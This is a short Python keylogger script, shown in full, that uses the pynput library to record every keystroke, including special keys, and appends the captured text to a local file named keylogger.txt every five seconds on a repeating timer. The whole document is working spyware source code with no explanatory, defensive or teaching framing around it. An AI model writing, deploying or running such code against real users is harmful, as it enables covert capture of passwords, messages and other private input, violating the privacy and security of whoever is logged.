#!/usr/bin/python

import pynput.keyboard
import threading


keys = ""
def process_keys(key):
	global keys
	try:
		keys = keys + str(key.char)
	except AttributeError:
		if key == key.space:
			keys = keys + " "
		else:
			keys = keys + " " + str(key) + " "

def report():
	global keys
	with open('keylogger.txt','a') as file:
		file.write(keys)
		keys = ""
		file.close()
	timer = threading.Timer(5,report)
	timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press = process_keys)
with keyboard_listener:
	report()
	keyboard_listener.join()


